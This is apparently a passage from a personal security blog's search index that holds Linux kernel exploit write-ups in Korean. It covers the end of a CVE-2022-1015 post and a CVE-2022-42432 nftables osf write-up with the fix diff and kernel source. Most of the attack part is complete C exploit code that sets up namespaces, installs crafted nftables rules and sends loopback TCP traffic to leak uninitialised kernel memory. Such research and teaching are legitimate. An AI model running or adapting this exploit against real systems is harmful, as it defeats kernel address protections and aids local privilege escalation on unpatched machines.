nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool delete_chain(char * table_name, char * chain_name){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool create_rule(struct nftnl_rule * r) { struct mnl_socket *nl; struct nlmsghdr *nlh; struct mnl_nlmsg_batch *batch; char buf[MNL_SOCKET_BUFFER_SIZE]; uint32_t seq = time(NULL); int ret; nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY), NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++); nftnl_rule_nlmsg_build_payload(nlh, r); nftnl_rule_free(r); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)); if (ret == -1) { perror(\u0026#34;mnl_socket_sendto\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); if (ret == -1) { perror(\u0026#34;mnl_socket_recvfrom\u0026#34;); return false; } ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL); if (ret \u0026lt; 0) { perror(\u0026#34;mnl_cb_run\u0026#34;); return false; } mnl_socket_close(nl); return true; } static void add_meta(struct nftnl_rule *r, uint32_t key, uint32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;meta\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_META_KEY, key); nftnl_expr_set_u32(e, NFTNL_EXPR_META_DREG, dreg); nftnl_rule_add_expr(r, e); } static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op, const void *data, uint32_t data_len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;cmp\u0026#34;); if (e == NULL) { perror(\u0026#34;expr cmp oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg); nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op); nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len); nftnl_rule_add_expr(r, e); } static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t sreg, uint32_t dreg, uint32_t offset, uint32_t len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;payload\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base); if(sreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg); if(dreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len); nftnl_rule_add_expr(r, e); } int add_verdict(struct nftnl_rule *r, int verdict, char * chain, u_int32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;immediate\u0026#34;); if (e == NULL) { perror(\u0026#34;expr payload oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); if(chain) nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain); nftnl_rule_add_expr(r, e); return 0; } void write_file(const char *filename, char *text) { int fd = open(filename, O_RDWR); write(fd, text, strlen(text)); close(fd); } void new_ns(void) { uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100]; if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) { perror(\u0026#34; [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)\u0026#34;); exit(EXIT_FAILURE); } if (unshare(CLONE_NEWNET)){ perror(\u0026#34; [-] unshare(CLONE_NEWNET)\u0026#34;); exit(EXIT_FAILURE); } write_file(\u0026#34;/proc/self/setgroups\u0026#34;, \u0026#34;deny\u0026#34;); snprintf(buffer, sizeof(buffer), \u0026#34;0 %d 1\u0026#34;, uid); write_file(\u0026#34;/proc/self/uid_map\u0026#34;, buffer); snprintf(buffer, sizeof(buffer), \u0026#34;0 %d 1\u0026#34;, gid); write_file(\u0026#34;/proc/self/gid_map\u0026#34;, buffer); } #ifndef HEXDUMP_COLS #define HEXDUMP_COLS 16 #endif void hexdump(void *mem, unsigned int len) { unsigned int i, j; for(i = 0; i \u0026lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf(\u0026#34;0x%06x: \u0026#34;, i); } /* print hex data */ if(i \u0026lt; len) { printf(\u0026#34;%02x \u0026#34;, 0xFF \u0026amp; ((char*)mem)[i]); } else /* end of block, just aligning for ASCII dump */ { printf(\u0026#34; \u0026#34;); } /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(j = i - (HEXDUMP_COLS - 1); j \u0026lt;= i; j++) { if(j \u0026gt;= len) /* end of block, not really printing */ { putchar(\u0026#39; \u0026#39;); } else if(isprint(((char*)mem)[j])) /* printable char */ { putchar(0xFF \u0026amp; ((char*)mem)[j]); } else /* other char */ { putchar(\u0026#39;.\u0026#39;); } } putchar(\u0026#39;\\n\u0026#39;); } } } https://youtube.com/shorts/z0n_A8paaqU Exploit\n","permalink":"https://msh1307.kr/blog/cve-2022-1015-linux-kernel-netfilter/","summary":"Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.\nNamespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.\nnested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다.","title":"CVE-2022-1015 Linux kernel netfilter"},{"content":"CVE-2022-42432 struct expr_ops expr_ops_osf = { .name\t= \u0026#34;osf\u0026#34;, .alloc_len\t= sizeof(struct nftnl_expr_osf), .max_attr\t= NFTA_OSF_MAX, .set\t= nftnl_expr_osf_set, .get\t= nftnl_expr_osf_get, .parse\t= nftnl_expr_osf_parse, .build\t= nftnl_expr_osf_build, .output\t= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.\nstruct nftnl_expr_osf { enum nft_registers\tdreg; uint8_t\tttl; uint32_t\tflags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(\u0026amp;osf-\u0026gt;dreg, data, sizeof(osf-\u0026gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(\u0026amp;osf-\u0026gt;ttl, data, sizeof(osf-\u0026gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(\u0026amp;osf-\u0026gt;flags, data, sizeof(osf-\u0026gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다.\nenum expr_types { EXPR_INVALID, EXPR_VERDICT, EXPR_SYMBOL, EXPR_VARIABLE, EXPR_VALUE, EXPR_PREFIX, EXPR_RANGE, EXPR_PAYLOAD, EXPR_EXTHDR, EXPR_META, EXPR_SOCKET, EXPR_OSF, EXPR_CT, EXPR_CONCAT, EXPR_LIST, EXPR_SET, EXPR_SET_REF, EXPR_SET_ELEM, EXPR_MAPPING, EXPR_MAP, EXPR_UNARY, EXPR_BINOP, EXPR_RELATIONAL, EXPR_NUMGEN, EXPR_HASH, EXPR_RT, EXPR_FIB, EXPR_XFRM, EXPR_SET_ELEM_CATCHALL, EXPR_FLAGCMP, EXPR_MAX = EXPR_FLAGCMP }; strncpy((char *)dest, \u0026#34;unknown\u0026#34;, NFT_OSF_MAXGENRELEN); } else { if (priv-\u0026gt;flags \u0026amp; NFT_OSF_F_VERSION) snprintf(os_match, NFT_OSF_MAXGENRELEN, \u0026#34;%s:%s\u0026#34;, data.genre, data.version); flags에는 NFT_OSF_F_VERSION을 세팅해줘야 더 많이 복사가 된다?\nRoot Cause diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c index 0fa2e2030427..ee6840bd5933 100644 --- a/net/netfilter/nfnetlink_osf.c +++ b/net/netfilter/nfnetlink_osf.c @@ -269,6 +269,7 @@ bool nf_osf_find(const struct sk_buff *skb, struct nf_osf_hdr_ctx ctx; const struct tcphdr *tcp; struct tcphdr _tcph; +\tbool found = false; memset(\u0026amp;ctx, 0, sizeof(ctx)); @@ -283,10 +284,11 @@ bool nf_osf_find(const struct sk_buff *skb, data-\u0026gt;genre = f-\u0026gt;genre; data-\u0026gt;version = f-\u0026gt;version; +\tfound = true; break; } -\treturn true; +\treturn found; } EXPORT_SYMBOL_GPL(nf_osf_find); nf_osf_find 함수가 항상 true를 리턴해서 초기화되지 않은 영역을 릭할 수 있다.\nbool nf_osf_find(const struct sk_buff *skb, const struct list_head *nf_osf_fingers, const int ttl_check, struct nf_osf_data *data) { const struct iphdr *ip = ip_hdr(skb); const struct nf_osf_user_finger *f; unsigned char opts[MAX_IPOPTLEN]; const struct nf_osf_finger *kf; struct nf_osf_hdr_ctx ctx; const struct tcphdr *tcp; struct tcphdr _tcph; memset(\u0026amp;ctx, 0, sizeof(ctx)); tcp = nf_osf_hdr_ctx_init(\u0026amp;ctx, skb, ip, opts, \u0026amp;_tcph); if (!tcp) return false; list_for_each_entry_rcu(kf, \u0026amp;nf_osf_fingers[ctx.df], finger_entry) { f = \u0026amp;kf-\u0026gt;finger; if (!nf_osf_match_one(skb, f, ttl_check, \u0026amp;ctx)) continue; data-\u0026gt;genre = f-\u0026gt;genre; data-\u0026gt;version = f-\u0026gt;version; break; } return true; } EXPORT_SYMBOL_GPL(nf_osf_find); nf_osf_fingers를 돌면서 kf에 값을 할당한뒤, match하는지 확인한다.\nstatic void nft_osf_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { struct nft_osf *priv = nft_expr_priv(expr); u32 *dest = \u0026amp;regs-\u0026gt;data[priv-\u0026gt;dreg]; struct sk_buff *skb = pkt-\u0026gt;skb; char os_match[NFT_OSF_MAXGENRELEN + 1]; const struct tcphdr *tcp; struct nf_osf_data data; struct tcphdr _tcph; if (pkt-\u0026gt;tprot != IPPROTO_TCP) { regs-\u0026gt;verdict.code = NFT_BREAK; return; } tcp = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(struct tcphdr), \u0026amp;_tcph); if (!tcp) { regs-\u0026gt;verdict.code = NFT_BREAK; return; } if (!tcp-\u0026gt;syn) { regs-\u0026gt;verdict.code = NFT_BREAK; return; } if (!nf_osf_find(skb, nf_osf_fingers, priv-\u0026gt;ttl, \u0026amp;data)) { strncpy((char *)dest, \u0026#34;unknown\u0026#34;, NFT_OSF_MAXGENRELEN); } else { if (priv-\u0026gt;flags \u0026amp; NFT_OSF_F_VERSION) snprintf(os_match, NFT_OSF_MAXGENRELEN, \u0026#34;%s:%s\u0026#34;, data.genre, data.version); else strlcpy(os_match, data.genre, NFT_OSF_MAXGENRELEN); strncpy((char *)dest, os_match, NFT_OSF_MAXGENRELEN); } } 무조건 true가 리턴되기 때문에 data 부분 릭 가능하다.\nstatic bool nf_osf_match_one(const struct sk_buff *skb, const struct nf_osf_user_finger *f, int ttl_check, struct nf_osf_hdr_ctx *ctx) { const __u8 *optpinit = ctx-\u0026gt;optp; unsigned int check_WSS = 0; int fmatch = FMATCH_WRONG; int foptsize, optnum; u16 mss = 0; if (ctx-\u0026gt;totlen != f-\u0026gt;ss || !nf_osf_ttl(skb, ttl_check, f-\u0026gt;ttl)) return false; /* * Should not happen if userspace parser was written correctly. */ find안에서 호출하는데, 이때 이부분을 잘 조작해서 무조건 false 리턴하게해서 넘어가면 된다.\nLeak nft log를 호출해서 모듈의 rodata section 부분을 가져올 수 있고, 코드 영역도 구할 수 있다.\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; #include \u0026#34;utils.h\u0026#34; #include \u0026lt;linux/netfilter/nf_tables.h\u0026gt; #include \u0026lt;linux/netfilter/nfnetlink.h\u0026gt; #define SIZE 0x800 // static struct nftnl_rule *isolate_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain) // { // struct nftnl_rule *r = NULL; // uint16_t port = 8888; // r = nftnl_rule_alloc(); // if (r == NULL) { // perror(\u0026#34;OOM\u0026#34;); // exit(EXIT_FAILURE); // } // nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); // nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); // nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); // add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 13,1); // 0x18 -\u0026gt; PSH ACK // add_cmp(r,NFT_REG_1, NFT_CMP_EQ, \u0026#34;\\x18\u0026#34;,1); // add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT); // // TODO // return r; // } static struct nftnl_rule *edit_pkt_data(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\u0026#34;OOM\u0026#34;); exit(EXIT_FAILURE); } // enum nft_payload_bases { // NFT_PAYLOAD_LL_HEADER, // NFT_PAYLOAD_NETWORK_HEADER, // NFT_PAYLOAD_TRANSPORT_HEADER, // }; nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG32_08, 13,4); add_cmp(r, NFT_REG32_08, NFT_CMP_EQ, \u0026#34;\\x18\u0026#34;, 1); mov_imm(r, NFT_REG_4,\u0026#34;\\x02\u0026#34;,1); // add_bitwise(r, 0x2); // 2 // add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, 0, 2,2); // total len corrupt add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_4, 0, 13,1); // add_cmp(r,NFT_REG_3,NFT_CMP_NEQ, \u0026#34;\\xff\u0026#34;,1); // NO CRASH BUT NOT LEAKED add_log(r); // LEAK // add_range(r); add_osf(r, NFT_REG_1, 0, NFT_OSF_F_VERSION); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_1, 0, 0x28,0x10); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_08, 0, 13,1); // TODO return r; } void install_rule_for_leak() { // if(create_rule(isolate_pkt(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;leak\u0026#34;)) == 0 ){ // perror(\u0026#34;error creating rule\u0026#34;); // exit(EXIT_FAILURE); // } // if(create_rule(edit_pkt_data(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;leak\u0026#34;)) == 0 ){ // perror(\u0026#34;error creating rule\u0026#34;); // exit(EXIT_FAILURE); // } if(create_rule(edit_pkt_data(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;input\u0026#34;)) == 0 ){ perror(\u0026#34;error creating rule\u0026#34;); exit(EXIT_FAILURE); } } void client(void * data){ int sockfd; struct sockaddr_in server_addr; char * buf = malloc(0x200); sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd == -1) { perror(\u0026#34;socket\u0026#34;); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); inet_pton(AF_INET, \u0026#34;127.0.0.1\u0026#34;, \u0026amp;(server_addr.sin_addr)); if (connect(sockfd, (struct sockaddr *)\u0026amp;server_addr, sizeof((server_addr))) == -1) { perror(\u0026#34;connect\u0026#34;); close(sockfd); exit(EXIT_FAILURE); } for(int i =0;i\u0026lt;4;i++){ int res = write(sockfd, data, SIZE); } close(sockfd); return 0; } void server(void *buf) { struct sockaddr_in server_addr; socklen_t server_addr_len; struct sockaddr_in client_addr; socklen_t client_addr_len; char tmp[0x200]; client_addr_len = sizeof(client_addr); int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd == -1) { perror(\u0026#34;socket\u0026#34;); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); server_addr.sin_addr.s_addr = htonl(INADDR_ANY); if (bind(fd, (struct sockaddr *)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;bind\u0026#34;); close(fd); exit(EXIT_FAILURE); } if (listen(fd, 50) \u0026lt; 0) { perror(\u0026#34;listen\u0026#34;); close(fd); exit(EXIT_FAILURE); } int cl_sock = accept(fd, (struct sockaddr *)\u0026amp;client_addr, \u0026amp;client_addr_len); if (cl_sock \u0026lt; 0){ perror(\u0026#34;accept\u0026#34;); close(fd); exit(EXIT_FAILURE); } for (int i =0;i\u0026lt;4;i++){ int ret = read(cl_sock, buf, SIZE); hexdump(buf,0x20); uint64_t leak = *(uint64_t * )((uint64_t)buf + 9); printf(\u0026#34;Leaked : 0x%lx\\n\u0026#34;, leak); } close(cl_sock); // Close client socket close(fd); // Close server socket } int main(int argc, char *argv[]) { int tid, status; pthread_t p_thread; unsigned char udpbuf[512] = {0,}; uint64_t kernel_base = 0; memset(udpbuf, 0x41, 512); new_ns(); system(\u0026#34;ip link set lo up\u0026#34;); uint64_t * buf = malloc(0x200); tid = pthread_create(\u0026amp;p_thread, NULL, server, buf); if (tid \u0026lt; 0){ perror(\u0026#34;thread create error : \u0026#34;); exit(0); } if(create_table(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, false) == 0){ perror(\u0026#34;error creating table\u0026#34;); exit(EXIT_FAILURE); } if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;input\u0026#34;, NF_INET_LOCAL_IN) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;leak\u0026#34;, 0) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } install_rule_for_leak(); printf(\u0026#34;[-] send \u0026amp; recv tcp packet\\n\u0026#34;); usleep(1000); client(udpbuf); sleep(1); return 0; } #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;netinet/ip.h\u0026gt; #include \u0026lt;netinet/tcp.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sched.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;linux/netfilter.h\u0026gt; #include \u0026lt;linux/netfilter/nfnetlink.h\u0026gt; #include \u0026lt;linux/netfilter/nf_tables.h\u0026gt; #include \u0026lt;libmnl/libmnl.h\u0026gt; #include \u0026lt;libnftnl/rule.h\u0026gt; #include \u0026lt;libnftnl/expr.h\u0026gt; #include \u0026lt;libnftnl/table.h\u0026gt; #include \u0026lt;libnftnl/chain.h\u0026gt; #include \u0026lt;libnftnl/rule.h\u0026gt; void add_log(struct nftnl_rule *r){ struct nftnl_expr * expr = nftnl_expr_alloc(\u0026#34;log\u0026#34;); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_GROUP, 0); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_PREFIX, \u0026#34;Packet logged: \u0026#34;); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_SNAPLEN, 128); nftnl_rule_add_expr(r, expr); } void add_range(struct nftnl_rule *r){ struct nftnl_expr * expr = nftnl_expr_alloc(\u0026#34;range\u0026#34;); nftnl_expr_set_u32(expr, NFTNL_EXPR_RANGE_SREG, NFT_REG_4); nftnl_expr_set_u32(expr, NFTNL_EXPR_RANGE_OP, NFT_RANGE_NEQ); nftnl_expr_set_u32(expr, NFTA_RANGE_FROM_DATA, 0xff); nftnl_expr_set_u32(expr, NFTA_RANGE_TO_DATA, 0x100); nftnl_rule_add_expr(r, expr); } void add_bitwise(struct nftnl_rule *r, uint32_t bitmask){ struct nftnl_expr * expr = nftnl_expr_alloc(\u0026#34;bitwise\u0026#34;); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_SREG, NFT_REG_2); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DREG, NFT_REG_4); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_OP, NFTA_BITWISE_DATA); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_LEN, 1); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_MASK, bitmask); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DATA, 0x2); nftnl_rule_add_expr(r, expr); } void mov_imm(struct nftnl_rule *r, uint32_t dreg, uint8_t * data, uint32_t datalen) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;immediate\u0026#34;); if (e == NULL) { perror(\u0026#34;expr imm oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set(e,NFTNL_EXPR_IMM_DATA,data,datalen); nftnl_rule_add_expr(r, e); } void add_osf(struct nftnl_rule *r, uint32_t dreg, uint8_t ttl, uint32_t flags) { struct nftnl_expr *e; e = nftnl_expr_alloc(\u0026#34;osf\u0026#34;); if (e == NULL) { perror(\u0026#34;expr osf oom\u0026#34;); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_OSF_DREG, dreg); nftnl_expr_set_u8(e, NFTNL_EXPR_OSF_TTL, ttl); nftnl_expr_set_u32(e, NFTNL_EXPR_OSF_FLAGS, flags); nftnl_rule_add_expr(r, e); } void pin_cpu(int cpu) { cpu_set_t set; CPU_ZERO(\u0026amp;set); CPU_SET(cpu, \u0026amp;set); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026amp;set)) { printf(\u0026#34;error\\n\u0026#34;); exit(-1); } } bool create_table(uint32_t protocol, char * table_name, bool delete){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, table_seq, chain_seq, family; struct nftnl_table *t; struct mnl_nlmsg_batch *batch; int ret, batching; t = nftnl_table_alloc(); if (t == NULL) { perror(\u0026#34;nftnl_table_alloc\u0026#34;); return false; } nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, protocol); nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); batching = nftnl_batch_is_supported(); if (batching \u0026lt; 0) { perror(\u0026#34;cannot talk to nfnetlink\u0026#34;); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } table_seq = seq; nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), delete?NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_table_nlmsg_build_payload(nlh, t); nftnl_table_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool create_chain(char * table_name, char * chain_name, uint32_t hook_num){ // NF_INET_LOCAL_IN struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); if(hook_num != 0) nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hook_num); nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); batching = nftnl_batch_is_supported(); if (batching \u0026lt; 0) { perror(\u0026#34;cannot talk to nfnetlink\u0026#34;); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), 